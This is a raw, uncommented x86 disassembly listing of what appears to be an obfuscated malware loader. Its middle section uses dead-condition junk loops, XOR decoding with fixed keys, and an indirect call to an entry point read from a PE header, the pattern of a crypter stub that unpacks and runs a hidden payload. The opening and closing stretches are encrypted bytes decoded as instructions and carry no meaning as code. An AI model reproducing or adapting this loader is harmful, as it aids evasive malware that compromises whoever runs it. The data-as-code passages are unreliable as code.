  409c20:	mov    ah,0xd8
  409c22:	(bad)  
  409c23:	and    al,BYTE PTR [eax]
  409c25:	enter  0x865d,0x65
  409c29:	push   es
  409c2a:	hlt    
  409c2b:	cli    
  409c2c:	sbb    eax,0x2dacb80c
  409c31:	jmp    0xd63d:0xa8ed7a55
  409c38:	xor    edx,ebx
  409c3a:	shr    BYTE PTR [edi],0x9b
  409c3d:	aaa    
  409c3e:	jbe    0x409bda
  409c40:	rcr    dl,cl
  409c42:	xadd   BYTE PTR [ecx],bl
  409c45:	(bad)  
  409c46:	or     bh,BYTE PTR [edi+0x13717473]
  409c4c:	xor    DWORD PTR [esi],esp
  409c4e:	jnp    0x409ccc
  409c50:	cmp    edi,DWORD PTR gs:[esi]
  409c53:	xchg   ecx,eax
  409c54:	dec    ebx
  409c55:	add    BYTE PTR [edi+0x4c],cl
  409c58:	sub    cl,BYTE PTR [edi+eiz*4-0x20e4caaa]
  409c5f:	push   ebx
  409c60:	bound  ebx,QWORD PTR [ebx+edi*8-0x21]
  409c64:	mov    dh,0x83
  409c66:	into   
  409c67:	ja     0x409c38
  409c69:	nop
  409c6a:	xor    eax,0x38d405bc
  409c6f:	lods   eax,DWORD PTR ds:[esi]
  409c70:	ins    DWORD PTR es:[edi],dx
  409c71:	test   DWORD PTR ss:[esi+edi*2-0x7ecfed9d],esi
  409c79:	dec    esi
  409c7a:	std    
  409c7b:	nop
  409c7c:	dec    edx
  409c7d:	rcl    DWORD PTR [edi-0x2f],cl
  409c80:	retf   
  409c81:	xchg   DWORD PTR [ebx+0x47d3b476],edi
  409c87:	dec    ebx
  409c88:	mov    ebp,DWORD PTR [ebx-0x6648a33a]
  409c8e:	xchg   esp,eax
  409c8f:	call   0xa3ea0a84
  409c94:	cmp    BYTE PTR gs:[edx],0x3d
  409c98:	cld    
  409c99:	dec    esp
  409c9a:	pop    eax
  409c9b:	mov    eax,ds:0xc6774061
  409ca0:	mov    esi,0x6399ff2f
  409ca5:	test   DWORD PTR fs:[esi],edx
  409ca8:	mov    eax,ds:0x5fb05c08
  409cad:	pop    edx
  409cae:	mov    al,0xed
  409cb0:	and    bh,BYTE PTR [ecx]
  409cb2:	clc    
  409cb3:	mov    eax,ds:0xcbbeed9e
  409cb8:	repnz sti 
  409cba:	fcmovne st,st(0)
  409cbc:	lods   eax,DWORD PTR ds:[esi]
  409cbd:	es cmp bl,al
  409cc0:	(bad)  
  409cc1:	loope  0x409ca5
  409cc3:	imul   edx,DWORD PTR [esi+0x6f],0x28
  409cc7:	add    al,0x1a
  409cc9:	mov    WORD PTR [edx],ss
  409ccb:	jle    0x409ced
  409ccd:	mov    ebx,fs
  409ccf:	cmp    DWORD PTR [edi+0x33],esp
  409cd2:	sar    BYTE PTR [edi-0x32729c],1
  409cd8:	sub    edi,edx
  409cda:	add    edi,DWORD PTR [ebp-0x10]
  409cdd:	mov    edx,DWORD PTR [ebp-0x20]
  409ce0:	mov    ebx,DWORD PTR [ebp-0x8]
  409ce3:	xor    edx,eax
  409ce5:	add    edx,ecx
  409ce7:	imul   edx,ebx
  409cea:	cmp    edx,edi
  409cec:	jbe    0x407fba
  409cf2:	pop    ebx
  409cf3:	pop    edi
  409cf4:	leave  
  409cf5:	ret    0x8
  409cf8:	push   ebp
  409cf9:	mov    ebp,esp
  409cfb:	sub    esp,0x70
  409cfe:	xor    DWORD PTR ds:0x43437a,0x600e
  409d08:	push   0x4162b4
  409d0d:	call   DWORD PTR ds:0x432d36
  409d13:	test   ax,ax
  409d16:	jne    0x409d2d
  409d1c:	add    DWORD PTR ds:0x432de2,0x43438a
  409d26:	xor    eax,eax
  409d28:	jmp    0x40a478
  409d2d:	call   DWORD PTR ds:0x432d92
  409d33:	cdq    
  409d34:	mov    DWORD PTR ds:0x432dd2,0x2a3f
  409d3e:	cmp    eax,0x98216565
  409d43:	jne    0x409d55
  409d49:	cmp    edx,0x98798767
  409d4f:	je     0x409d1c
  409d55:	push   0x4162c0
  409d5a:	sub    DWORD PTR ds:0x432dd2,0x490f
  409d64:	call   DWORD PTR ds:0x432ca2
  409d6a:	add    DWORD PTR ds:0x434421,0x7629
  409d74:	test   eax,eax
  409d76:	mov    DWORD PTR ds:0x432dc2,0x36af
  409d80:	jne    0x409d1c
  409d86:	sub    DWORD PTR ds:0x434421,0x434415
  409d90:	push   ebx
  409d91:	xor    DWORD PTR ds:0x432704,ecx
  409d97:	mov    ebx,0xf89c8531
  409d9c:	or     ecx,0x58cd
  409da2:	mov    DWORD PTR [ebp-0x8],ebx
  409da5:	xor    DWORD PTR ds:0x434429,0x5f13
  409daf:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  409db6:	and    DWORD PTR ds:0x43439a,0x0
  409dc0:	jmp    0x409dd2
  409dc5:	mov    ecx,DWORD PTR ds:0x43439a
  409dcb:	inc    ecx
  409dcc:	mov    DWORD PTR ds:0x43439a,ecx
  409dd2:	cmp    DWORD PTR ds:0x43439a,0x10
  409dd9:	jae    0x409e48
  409ddf:	cmp    DWORD PTR ds:0x43439a,0x13
  409de6:	jne    0x409dfc
  409dec:	push   0x432833
  409df1:	push   0x432718
  409df6:	call   DWORD PTR ds:0x432cfe
  409dfc:	jmp    0x409dc5
  409e01:	and    DWORD PTR ds:0x4343a2,0x0
  409e0b:	mov    ecx,DWORD PTR ds:0x4343a2
  409e11:	inc    ecx
  409e12:	mov    DWORD PTR ds:0x4343a2,ecx
  409e18:	cmp    DWORD PTR ds:0x4343a2,0x20
  409e1f:	jne    0x409e3b
  409e25:	push   DWORD PTR [ebp-0x1c]
  409e28:	push   DWORD PTR [ebp-0x10]
  409e2b:	push   0x1942
  409e30:	push   0x6344
  409e35:	call   DWORD PTR ds:0x432d02
  409e3b:	cmp    DWORD PTR ds:0x4343a2,0x1e
  409e42:	jb     0x409e0b
  409e48:	lea    eax,[ebp-0x18]
  409e4b:	sub    DWORD PTR ds:0x43442d,0x379b
  409e55:	mov    DWORD PTR [ebp-0x14],eax
  409e58:	lea    eax,[ebp-0x1c]
  409e5b:	and    DWORD PTR ds:0x432700,0x0
  409e65:	mov    ecx,DWORD PTR ds:0x432700
  409e6b:	inc    ecx
  409e6c:	mov    DWORD PTR ds:0x432700,ecx
  409e72:	cmp    DWORD PTR ds:0x432700,0x20
  409e79:	jne    0x409e98
  409e7f:	push   DWORD PTR [ebp-0xc]
  409e82:	push   DWORD PTR [ebp-0x10]
  409e85:	push   0x37d5
  409e8a:	push   0x73f1
  409e8f:	push   DWORD PTR [ebp-0x1c]
  409e92:	call   DWORD PTR ds:0x4329d6
  409e98:	cmp    DWORD PTR ds:0x432700,0x18
  409e9f:	jb     0x409e65
  409ea5:	and    DWORD PTR ds:0x4326ec,0x0
  409eaf:	mov    ecx,DWORD PTR ds:0x4326ec
  409eb5:	inc    ecx
  409eb6:	mov    DWORD PTR ds:0x4326ec,ecx
  409ebc:	cmp    DWORD PTR ds:0x4326ec,0x19
  409ec3:	jne    0x409ed4
  409ec9:	push   0x477f
  409ece:	call   DWORD PTR ds:0x4329da
  409ed4:	cmp    DWORD PTR ds:0x4326ec,0x13
  409edb:	jb     0x409eaf
  409ee1:	mov    ecx,DWORD PTR ds:0x432dd6
  409ee7:	xor    DWORD PTR ds:0x43439e,ecx
  409eed:	mov    DWORD PTR [ebp-0xc],eax
  409ef0:	and    DWORD PTR ds:0x4326f4,0x0
  409efa:	jmp    0x409f0d
  409eff:	xor    eax,eax
  409f01:	add    eax,DWORD PTR ds:0x4326f4
  409f07:	inc    eax
  409f08:	mov    ds:0x4326f4,eax
  409f0d:	cmp    DWORD PTR ds:0x4326f4,0x1a
  409f14:	jae    0x409f4f
  409f1a:	cmp    DWORD PTR ds:0x4326f4,0x21
  409f21:	jne    0x409f4a
  409f27:	push   0x432de6
  409f2c:	push   DWORD PTR [ebp-0x28]
  409f2f:	push   DWORD PTR [ebp-0x18]
  409f32:	push   0x87ba
  409f37:	push   0x20df
  409f3c:	push   0x519b
  409f41:	push   DWORD PTR [ebp-0x18]
  409f44:	call   DWORD PTR ds:0x432d06
  409f4a:	jmp    0x409eff
  409f4f:	mov    eax,ds:0x4161a0
  409f54:	mov    DWORD PTR ds:0x4326f4,0x19
  409f5e:	cmp    DWORD PTR ds:0x4326f4,0x0
  409f65:	je     0x409fb2
  409f6b:	cmp    DWORD PTR ds:0x4326f4,0x21
  409f72:	jne    0x409fa0
  409f78:	push   0x2812
  409f7d:	push   0x6a58
  409f82:	push   DWORD PTR [ebp-0x24]
  409f85:	push   0x8f98
  409f8a:	push   DWORD PTR [ebp-0x20]
  409f8d:	push   0x26e4
  409f92:	push   DWORD PTR [ebp-0x14]
  409f95:	push   0x4328ab
  409f9a:	call   DWORD PTR ds:0x432d0a
  409fa0:	mov    ecx,DWORD PTR ds:0x4326f4
  409fa6:	dec    ecx
  409fa7:	mov    DWORD PTR ds:0x4326f4,ecx
  409fad:	jmp    0x409f5e
  409fb2:	mov    eax,DWORD PTR [eax+0x1c8]
  409fb8:	xor    DWORD PTR ds:0x4326f4,edx
  409fbe:	mov    eax,DWORD PTR [eax]
  409fc0:	mov    ecx,DWORD PTR [ebp-0xc]
  409fc3:	add    DWORD PTR ds:0x4326f0,0x3eda
  409fcd:	push   esi
  409fce:	mov    esi,0x7510855
  409fd3:	sbb    DWORD PTR ds:0x434415,0x118a
  409fdd:	xor    eax,esi
  409fdf:	sbb    DWORD PTR ds:0x43438e,0x43437a
  409fe9:	push   edi
  409fea:	xor    edi,DWORD PTR ds:0x43438a
  409ff0:	mov    edi,0x32729c
  409ff5:	adc    DWORD PTR ds:0x434415,0x7b86
  409fff:	add    eax,edi
  40a001:	mov    DWORD PTR [ecx],eax
  40a003:	mov    eax,ds:0x4163b4
  40a008:	mov    DWORD PTR ds:0x432dde,0x674a
  40a012:	cmp    eax,0x23c13046
  40a017:	mov    eax,DWORD PTR [ebp-0x4]
  40a01a:	je     0x40a046
  40a020:	mov    ecx,DWORD PTR [ebp-0x8]
  40a023:	xor    eax,esi
  40a025:	sub    DWORD PTR ds:0x4326f4,0x7cc4
  40a02f:	add    eax,edi
  40a031:	add    DWORD PTR ds:0x434386,0x4326f4
  40a03b:	imul   eax,ecx
  40a03e:	mov    DWORD PTR [ebp-0x8],eax
  40a041:	jmp    0x40a156
  40a046:	and    DWORD PTR ds:0x432dde,0x0
  40a050:	mov    ecx,DWORD PTR ds:0x432dde
  40a056:	inc    ecx
  40a057:	mov    DWORD PTR ds:0x432dde,ecx
  40a05d:	cmp    DWORD PTR ds:0x432dde,0x26
  40a064:	jne    0x40a07d
  40a06a:	push   DWORD PTR [ebp-0x18]
  40a06d:	push   0x709e
  40a072:	push   0x1359
  40a077:	call   DWORD PTR ds:0x432d0e
  40a07d:	cmp    DWORD PTR ds:0x432dde,0x19
  40a084:	jb     0x40a050
  40a08a:	xor    eax,esi
  40a08c:	and    DWORD PTR ds:0x434396,0x0
  40a096:	mov    ecx,DWORD PTR ds:0x434396
  40a09c:	inc    ecx
  40a09d:	mov    DWORD PTR ds:0x434396,ecx
  40a0a3:	cmp    DWORD PTR ds:0x434396,0x10
  40a0aa:	jne    0x40a0c0
  40a0b0:	push   0x432805
  40a0b5:	push   0x43281d
  40a0ba:	call   DWORD PTR ds:0x4329de
  40a0c0:	cmp    DWORD PTR ds:0x434396,0xf
  40a0c7:	jne    0x40a0da
  40a0cd:	mov    ecx,DWORD PTR ds:0x434396
  40a0d3:	inc    ecx
  40a0d4:	mov    DWORD PTR ds:0x434396,ecx
  40a0da:	cmp    DWORD PTR ds:0x434396,0x1e
  40a0e1:	jb     0x40a096
  40a0e7:	add    eax,edi
  40a0e9:	mov    ds:0x4162b0,eax
  40a0ee:	mov    ecx,DWORD PTR ds:0x434366
  40a0f4:	sbb    DWORD PTR ds:0x434415,ecx
  40a0fa:	mov    eax,DWORD PTR [ebp-0x8]
  40a0fd:	sbb    ecx,DWORD PTR ds:0x432dd6
  40a103:	xor    eax,esi
  40a105:	not    ecx
  40a107:	add    eax,edi
  40a109:	mov    ds:0x4163b4,eax
  40a10e:	mov    eax,DWORD PTR [ebp-0x4]
  40a111:	mov    ecx,DWORD PTR ds:0x4162b0
  40a117:	sub    DWORD PTR ds:0x4326f0,0x434415
  40a121:	xor    eax,esi
  40a123:	add    eax,edi
  40a125:	mov    DWORD PTR ds:0x434392,0x307
  40a12f:	cmp    ecx,eax
  40a131:	jne    0x40a156
  40a137:	xor    DWORD PTR ds:0x432dce,0x57b5
  40a141:	push   DWORD PTR [ebp-0x4]
  40a144:	sub    DWORD PTR ds:0x434419,0x6bc5
  40a14e:	push   DWORD PTR [ebp-0x8]
  40a151:	call   0x40a47c
  40a156:	mov    eax,ds:0x4161a0
  40a15b:	mov    eax,DWORD PTR [eax+0x18c]
  40a161:	xor    ecx,ecx
  40a163:	mov    eax,DWORD PTR [eax]
  40a165:	sbb    DWORD PTR ds:0x434411,edx
  40a16b:	mov    DWORD PTR [ebp-0x20],eax
  40a16e:	inc    edx
  40a16f:	mov    eax,0xf89c853d
  40a174:	mov    DWORD PTR [ebp-0x24],eax
  40a177:	or     DWORD PTR ds:0x43436a,edx
  40a17d:	mov    DWORD PTR [ebp-0x24],eax
  40a180:	and    DWORD PTR ds:0x43439a,0x0
  40a18a:	jmp    0x40a19c
  40a18f:	mov    edx,DWORD PTR ds:0x43439a
  40a195:	inc    edx
  40a196:	mov    DWORD PTR ds:0x43439a,edx
  40a19c:	cmp    DWORD PTR ds:0x43439a,0x10
  40a1a3:	jae    0x40a1f4
  40a1a9:	cmp    DWORD PTR ds:0x43439a,0x6
  40a1b0:	jne    0x40a1d3
  40a1b6:	push   0x1088
  40a1bb:	push   DWORD PTR [ebp-0x1c]
  40a1be:	push   0x185d
  40a1c3:	push   0x432909
  40a1c8:	push   0x400000
  40a1cd:	call   DWORD PTR ds:0x4329e2
  40a1d3:	cmp    DWORD PTR ds:0x43439a,0x5
  40a1da:	jne    0x40a1ef
  40a1e0:	xor    edx,edx
  40a1e2:	or     edx,DWORD PTR ds:0x43439a
  40a1e8:	inc    edx
  40a1e9:	mov    DWORD PTR ds:0x43439a,edx
  40a1ef:	jmp    0x40a18f
  40a1f4:	mov    DWORD PTR [ebp-0x24],eax
  40a1f7:	mov    DWORD PTR [ebp-0xc],ebx
  40a1fa:	mov    DWORD PTR [ebp-0x24],eax
  40a1fd:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  40a204:	mov    ebx,DWORD PTR [ebp-0x8]
  40a207:	and    edx,DWORD PTR ds:0x43439a
  40a20d:	mov    ecx,DWORD PTR [ebp-0x4]
  40a210:	and    DWORD PTR ds:0x432dce,0x0
  40a21a:	mov    edx,DWORD PTR ds:0x432dce
  40a220:	inc    edx
  40a221:	mov    DWORD PTR ds:0x432dce,edx
  40a227:	cmp    DWORD PTR ds:0x432dce,0x22
  40a22e:	jne    0x40a23a
  40a234:	call   DWORD PTR ds:0x4329e6
  40a23a:	cmp    DWORD PTR ds:0x432dce,0x17
  40a241:	jb     0x40a21a
  40a247:	mov    edx,DWORD PTR [ebp-0x4]
  40a24a:	xor    edx,esi
  40a24c:	xor    ecx,esi
  40a24e:	add    ecx,edx
  40a250:	mov    edx,DWORD PTR [ebp-0x4]
  40a253:	xor    ebx,esi
  40a255:	xor    edx,esi
  40a257:	add    ebx,edi
  40a259:	lea    ecx,[ecx+edx*1+0x9757d4]
  40a260:	cmp    ebx,ecx
  40a262:	ja     0x40a2c3
  40a268:	mov    eax,DWORD PTR [ebp-0x4]
  40a26b:	xor    eax,esi
  40a26d:	lea    eax,[eax+ebx*1+0x32729c]
  40a274:	push   eax
  40a275:	mov    eax,DWORD PTR [ebp-0xc]
  40a278:	xor    eax,esi
  40a27a:	lea    eax,[ebp+eax*1+0x3272a4]
  40a281:	push   eax
  40a282:	mov    eax,ds:0x4161a0
  40a287:	push   DWORD PTR [eax+0x1bc]
  40a28d:	call   0x401a05
  40a292:	mov    eax,DWORD PTR [ebp-0x4]
  40a295:	xor    eax,esi
  40a297:	lea    ebx,[ebx+eax*1+0x32729c]
  40a29e:	mov    eax,DWORD PTR [ebp-0x4]
  40a2a1:	mov    ecx,DWORD PTR [ebp-0x4]
  40a2a4:	xor    ecx,esi
  40a2a6:	xor    eax,esi
  40a2a8:	add    eax,ecx
  40a2aa:	mov    ecx,DWORD PTR [ebp-0x4]
  40a2ad:	xor    ecx,esi
  40a2af:	lea    eax,[eax+ecx*1+0x9757d4]
  40a2b6:	cmp    ebx,eax
  40a2b8:	jbe    0x40a268
  40a2be:	mov    eax,0xf89c853d
  40a2c3:	mov    ecx,DWORD PTR [ebp+0xc]
  40a2c6:	mov    DWORD PTR ds:0x416024,ecx
  40a2cc:	mov    ecx,DWORD PTR [ebp+0x10]
  40a2cf:	mov    DWORD PTR ds:0x416278,ecx
  40a2d5:	mov    ecx,DWORD PTR ds:0x416024
  40a2db:	mov    edx,DWORD PTR [ebp-0x14]
  40a2de:	sub    ecx,edi
  40a2e0:	xor    ecx,esi
  40a2e2:	mov    DWORD PTR [edx],ecx
  40a2e4:	mov    ecx,DWORD PTR [ebp-0x18]
  40a2e7:	cmp    ecx,0xf89c8530
  40a2ed:	je     0x40a34a
  40a2f3:	mov    ecx,DWORD PTR [ebp-0x8]
  40a2f6:	mov    edx,DWORD PTR [ebp-0x1c]
  40a2f9:	xor    ecx,esi
  40a2fb:	add    ecx,edi
  40a2fd:	cmp    ecx,edx
  40a2ff:	je     0x40a34a
  40a305:	mov    eax,ds:0x4161a0
  40a30a:	mov    eax,DWORD PTR [eax+0x194]
  40a310:	mov    ecx,DWORD PTR [eax]
  40a312:	mov    eax,DWORD PTR [ecx+0x3c]
  40a315:	push   DWORD PTR ds:0x416278
  40a31b:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40a31f:	push   DWORD PTR ds:0x416024
  40a325:	add    eax,ecx
  40a327:	mov    ecx,DWORD PTR ds:0x4161a0
  40a32d:	mov    ecx,DWORD PTR [ecx+0x194]
  40a333:	push   DWORD PTR [ecx]
  40a335:	call   eax
  40a337:	mov    ecx,DWORD PTR ds:0x4161a0
  40a33d:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40a343:	mov    DWORD PTR [ecx],eax
  40a345:	jmp    0x40a45a
  40a34a:	mov    ecx,DWORD PTR [ebp-0x8]
  40a34d:	mov    edx,DWORD PTR [ebp-0x20]
  40a350:	xor    ecx,esi
  40a352:	add    ecx,edi
  40a354:	cmp    ecx,edx
  40a356:	jne    0x40a43d
  40a35c:	mov    ecx,DWORD PTR [ebp-0x8]
  40a35f:	xor    ecx,esi
  40a361:	add    ecx,edi
  40a363:	mov    DWORD PTR ds:0x416224,ecx
  40a369:	mov    ecx,DWORD PTR [ebp-0x8]
  40a36c:	xor    ecx,esi
  40a36e:	add    ecx,edi
  40a370:	mov    DWORD PTR ds:0x41621c,ecx
  40a376:	mov    ecx,DWORD PTR [ebp-0x4]
  40a379:	mov    DWORD PTR [ebp-0xc],ecx
  40a37c:	mov    ecx,DWORD PTR [ebp-0x8]
  40a37f:	mov    DWORD PTR [ebp+0xc],ecx
  40a382:	mov    ecx,DWORD PTR [ebp+0xc]
  40a385:	xor    ecx,esi
  40a387:	add    ecx,edi
  40a389:	mov    DWORD PTR [ebp+0xc],ecx
  40a38c:	mov    ecx,DWORD PTR ds:0x416020
  40a392:	mov    ecx,DWORD PTR [ecx]
  40a394:	mov    DWORD PTR [ebp+0xc],ecx
  40a397:	mov    ecx,DWORD PTR ds:0x416228
  40a39d:	mov    ecx,DWORD PTR [ecx]
  40a39f:	mov    DWORD PTR [ebp-0x14],ecx
  40a3a2:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  40a3a9:	mov    ecx,DWORD PTR [ebp+0x10]
  40a3ac:	xor    ecx,esi
  40a3ae:	add    ecx,edi
  40a3b0:	mov    DWORD PTR [ebp+0x10],ecx
  40a3b3:	mov    ecx,DWORD PTR ds:0x4161a0
  40a3b9:	mov    DWORD PTR [ebp+0x10],ecx
  40a3bc:	mov    ecx,DWORD PTR [ebp+0xc]
  40a3bf:	mov    DWORD PTR [ebp+0xc],ecx
  40a3c2:	mov    ecx,DWORD PTR [ebp+0xc]
  40a3c5:	push   0x4
  40a3c7:	pop    edx
  40a3c8:	sub    edx,ecx
  40a3ca:	add    edx,DWORD PTR [ebp-0x14]
  40a3cd:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40a3d4:	mov    DWORD PTR [ebp+0x10],edx
  40a3d7:	mov    DWORD PTR [ebp-0x70],eax
  40a3da:	mov    eax,DWORD PTR [ebp+0xc]
  40a3dd:	mov    DWORD PTR [ebp-0x6c],eax
  40a3e0:	mov    eax,DWORD PTR [ebp+0x10]
  40a3e3:	mov    DWORD PTR [ebp-0x68],eax
  40a3e6:	mov    eax,DWORD PTR [ebp-0x24]
  40a3e9:	xor    eax,esi
  40a3eb:	add    eax,edi
  40a3ed:	mov    DWORD PTR [ebp-0x64],eax
  40a3f0:	lea    eax,[ebp-0x2c]
  40a3f3:	mov    DWORD PTR [ebp-0x60],eax
  40a3f6:	mov    eax,DWORD PTR [ebp-0x70]
  40a3f9:	xor    eax,esi
  40a3fb:	add    eax,edi
  40a3fd:	mov    DWORD PTR [ebp-0x70],eax
  40a400:	lea    eax,[ebp-0x70]
  40a403:	push   eax
  40a404:	mov    eax,DWORD PTR [ebp-0xc]
  40a407:	xor    eax,esi
  40a409:	add    eax,edi
  40a40b:	push   eax
  40a40c:	mov    eax,ds:0x4161c0
  40a411:	push   0x416116
  40a416:	push   DWORD PTR [eax]
  40a418:	call   0x40d076
  40a41d:	xor    esi,esi
  40a41f:	mov    eax,DWORD PTR [ebp+0x10]
  40a422:	sub    eax,esi
  40a424:	push   eax
  40a425:	mov    eax,DWORD PTR [ebp+0xc]
  40a428:	add    eax,esi
  40a42a:	push   eax
  40a42b:	call   0x407765
  40a430:	inc    esi
  40a431:	cmp    esi,0x52
  40a434:	jb     0x40a41f
  40a43a:	mov    eax,DWORD PTR [ebp-0xc]
  40a43d:	call   0x405bf4
  40a442:	lea    eax,[ebp+0x4]
  40a445:	mov    DWORD PTR [ebp-0x28],eax
  40a448:	mov    eax,DWORD PTR [ebp-0x10]
  40a44b:	mov    eax,DWORD PTR [ebp-0x4]
  40a44e:	push   DWORD PTR [ebp-0x8]
  40a451:	lea    eax,[ebp-0x28]
  40a454:	push   eax
  40a455:	call   0x40c78b
  40a45a:	mov    eax,ds:0x4161a0
  40a45f:	push   0x4
  40a461:	add    eax,0x1cc
  40a466:	push   eax
  40a467:	lea    eax,[ebp-0x10]
  40a46a:	push   eax
  40a46b:	call   0x401a05
  40a470:	mov    eax,DWORD PTR [ebp-0x10]
  40a473:	mov    eax,DWORD PTR [eax]
  40a475:	pop    edi
  40a476:	pop    esi
  40a477:	pop    ebx
  40a478:	leave  
  40a479:	ret    0xc
  40a47c:	push   ebp
  40a47d:	mov    ebp,esp
  40a47f:	sub    esp,0x24
  40a482:	xor    ecx,ecx
  40a484:	or     ecx,DWORD PTR ds:0x434425
  40a48a:	sub    ecx,DWORD PTR ds:0x43442d
  40a490:	mov    DWORD PTR ds:0x434425,ecx
  40a496:	mov    eax,ds:0x4161a0
  40a49b:	mov    DWORD PTR ds:0x434392,0x17
  40a4a5:	cmp    DWORD PTR ds:0x434392,0x0
  40a4ac:	je     0x40a506
  40a4b2:	cmp    DWORD PTR ds:0x434392,0x5
  40a4b9:	jne    0x40a4d4
  40a4bf:	push   0x378d
  40a4c4:	push   0x43437a
  40a4c9:	push   0x4a36
  40a4ce:	call   DWORD PTR ds:0x432c56
  40a4d4:	cmp    DWORD PTR ds:0x434392,0x6
  40a4db:	jne    0x40a4ee
  40a4e1:	mov    ecx,DWORD PTR ds:0x434392
  40a4e7:	dec    ecx
  40a4e8:	mov    DWORD PTR ds:0x434392,ecx
  40a4ee:	mov    ecx,DWORD PTR ds:0x434392
  40a4f4:	dec    ecx
  40a4f5:	mov    DWORD PTR ds:0x434392,ecx
  40a4fb:	jmp    0x40a4a5
  40a500:	add    DWORD PTR ds:0x432de6,edx
  40a506:	mov    eax,DWORD PTR [eax+0x198]
  40a50c:	mov    ecx,DWORD PTR ds:0x434465
  40a512:	mov    ecx,DWORD PTR [ecx]
  40a514:	sub    DWORD PTR ds:0x434372,ecx
  40a51a:	mov    DWORD PTR [ebp-0x8],eax
  40a51d:	xor    eax,eax
  40a51f:	add    eax,DWORD PTR ds:0x434366
  40a525:	and    eax,DWORD PTR ds:0x4326f4
  40a52b:	mov    ds:0x434366,eax
  40a530:	mov    eax,DWORD PTR [ebp+0x8]
  40a533:	mov    ecx,DWORD PTR [ebp-0x8]
  40a536:	sub    DWORD PTR ds:0x432dde,0x4326f0
  40a540:	push   ebx
  40a541:	adc    DWORD PTR ds:0x434396,ebx
  40a547:	push   esi
  40a548:	mov    esi,0x7510855
  40a54d:	and    DWORD PTR ds:0x432dca,0x0
  40a557:	mov    ebx,DWORD PTR ds:0x432dca
  40a55d:	inc    ebx
  40a55e:	mov    DWORD PTR ds:0x432dca,ebx
  40a564:	cmp    DWORD PTR ds:0x432dca,0x2c
  40a56b:	jne    0x40a57a
  40a571:	push   DWORD PTR [ebp-0xc]
  40a574:	call   DWORD PTR ds:0x432c5a
  40a57a:	cmp    DWORD PTR ds:0x432dca,0x1e
  40a581:	jb     0x40a557
  40a587:	xor    eax,esi
  40a589:	and    DWORD PTR ds:0x4343a2,0x0
  40a593:	jmp    0x40a5a5
  40a598:	mov    ebx,DWORD PTR ds:0x4343a2
  40a59e:	inc    ebx
  40a59f:	mov    DWORD PTR ds:0x4343a2,ebx
  40a5a5:	cmp    DWORD PTR ds:0x4343a2,0x1a
  40a5ac:	jae    0x40a78c
  40a5b2:	cmp    DWORD PTR ds:0x4343a2,0x1d
  40a5b9:	jne    0x40a5cf
  40a5bf:	push   0x74a9
  40a5c4:	push   0x3c30
  40a5c9:	call   DWORD PTR ds:0x432c5e
  40a5cf:	jmp    0x40a598
  40a5d4:	jmp    0x40a78c
  40a5d9:	cmp    dh,BYTE PTR [esi+0x69734bd3]
  40a5df:	inc    edx
  40a5e0:	mov    ch,0x74
  40a5e2:	neg    DWORD PTR [ebx-0x6]
  40a5e5:	daa    
  40a5e6:	call   0xe1131dab
  40a5eb:	jo     0x40a65d
  40a5ed:	xchg   ebp,eax
  40a5ee:	jg     0x40a660
  40a5f0:	jo     0x40a609
  40a5f2:	nop
  40a5f3:	or     DWORD PTR [edx+esi*1+0x53],eax
  40a5f7:	retf   
  40a5f8:	sbb    BYTE PTR ds:0xabd0e5fa,ch
  40a5fe:	(bad)  
  40a5ff:	sbb    bh,bh
  40a601:	adc    eax,0x49d168fd
  40a606:	(bad)  
  40a608:	or     ah,cl
  40a60a:	cdq    
  40a60b:	mov    edx,0xba32fab5
  40a610:	add    DWORD PTR [edi-0x1537c32],ebp
  40a616:	sbb    BYTE PTR [esi],cl
  40a618:	jecxz  0x40a630
  40a61a:	dec    edx
  40a61b:	imul   esp,esp,0x9b0ea65
  40a621:	jecxz  0x40a5a9
  40a623:	cli    
  40a624:	std    
  40a625:	das    
  40a626:	mov    dh,BYTE PTR [ebp-0x70693b43]
  40a62c:	push   ss
  40a62d:	pop    eax
  40a62e:	fwait
  40a62f:	push   edi
  40a630:	add    ah,ch
  40a632:	xor    dh,ah
  40a634:	mov    DWORD PTR [ebp-0x74],eax
  40a637:	xchg   esp,eax
  40a638:	sub    DWORD PTR fs:[edi+0x54799413],ebp
  40a63f:	pop    ss
  40a640:	aad    0x53
  40a642:	or     ch,BYTE PTR cs:[ebx+ecx*2+0x67cfb438]
  40a64a:	push   es
  40a64b:	sbb    al,0x7e
  40a64d:	jmp    0x40a5f8
  40a64f:	test   DWORD PTR [edx+0x6a],ebx
  40a652:	mov    ecx,0x7002c265
  40a657:	in     al,0x60
  40a659:	daa    
  40a65a:	jle    0x40a6cc
  40a65c:	xor    BYTE PTR [edi-0x54592baf],dl
  40a662:	or     al,0xd8
  40a664:	enter  0xf38b,0xee
  40a668:	clc    
  40a669:	add    al,0xc3
  40a66b:	shr    dh,1
  40a66d:	popf   
  40a66e:	ins    DWORD PTR es:[edi],dx
  40a66f:	stc    
  40a670:	mov    ch,0x57
  40a672:	hlt    
  40a673:	xor    al,0x94
  40a675:	and    al,0x13
  40a677:	and    ebx,edi
  40a679:	les    eax,FWORD PTR [edx]
  40a67b:	push   ss
  40a67c:	adc    bh,BYTE PTR [edi+0x3e6febdb]
  40a682:	(bad)  
  40a683:	aad    0x35
  40a685:	in     al,dx
  40a686:	dec    esi
  40a687:	in     eax,0xc4
  40a689:	xchg   BYTE PTR [edx-0x25],dh
  40a68c:	mov    bl,ch
  40a68e:	and    al,0xe4
  40a690:	faddp  st(6),st
  40a692:	mov    ebp,0x8fdc8ead
  40a697:	and    DWORD PTR [ebp+0x348663a5],ebx
  40a69d:	cmp    al,0x4a
  40a69f:	xchg   ebx,eax
  40a6a0:	and    BYTE PTR [ebx-0x4d712d14],al
  40a6a6:	enter  0xcdfb,0x56
  40a6aa:	push   0xffffffba
  40a6ac:	xchg   edi,eax
  40a6ad:	(bad)  
  40a6ae:	ds loop 0x40a6e2
  40a6b1:	mov    esp,0x2dd70897
  40a6b6:	retf   
  40a6b7:	pop    ebx
  40a6b8:	mov    bh,0x3e
  40a6ba:	jl     0x40a72a
  40a6bc:	and    BYTE PTR [eax],bl
  40a6be:	or     ah,cl
  40a6c0:	retf   0x5950
  40a6c3:	cmp    al,BYTE PTR [edi]
  40a6c5:	scas   eax,DWORD PTR es:[edi]
  40a6c6:	outs   dx,DWORD PTR ds:[esi]
  40a6c7:	sti    
  40a6c8:	adc    eax,0x13
  40a6cb:	cs cld 
